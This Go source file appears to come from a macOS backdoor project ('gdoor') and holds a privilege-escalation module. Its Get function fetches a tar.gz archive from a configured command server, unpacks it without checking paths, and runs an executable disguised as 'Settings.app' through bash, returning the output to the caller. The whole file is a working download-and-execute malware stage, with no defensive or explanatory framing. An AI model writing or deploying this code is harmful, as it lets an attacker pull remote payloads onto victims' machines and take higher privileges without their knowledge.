package privilege

import (
	"archive/tar"
	"compress/gzip"
	"io"
	"net/http"
	"os"
	"os/exec"

	"gdoor/config"
)

func Get() (string, error) {
	// Download Settings.app.tar.gz
	resp, err := http.Get("http://" + config.ServerIP + config.FServerPort + "/root")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Extract
	err = ExtractTarGz(resp.Body)
	if err != nil {
		return "", err
	}

	// Run Settings.app
	output, err := exec.Command("/bin/bash", "-c", "chmod +x ./Settings.app/Contents/MacOS/Settings && ./Settings.app/Contents/MacOS/Settings").CombinedOutput()
	if err != nil {
		return "", err
	}

	return string(output), nil
}

func ExtractTarGz(gzipStream io.Reader) error {
	uncompressedStream, err := gzip.NewReader(gzipStream)
	if err != nil {
		return err
	}

	tarReader := tar.NewReader(uncompressedStream)

	for true {
		header, err := tarReader.Next()

		if err == io.EOF {
			break
		}

		if err != nil {
			return err
		}

		switch header.Typeflag {
		case tar.TypeDir:
			if err := os.Mkdir(header.Name, 0755); err != nil {
				return err
			}

		case tar.TypeReg:
			outFile, err := os.Create(header.Name)
			if err != nil {
				return err
			}
			defer outFile.Close()

			if _, err := io.Copy(outFile, tarReader); err != nil {
				return err
			}

		default:
			return err
		}
	}

	return nil
}
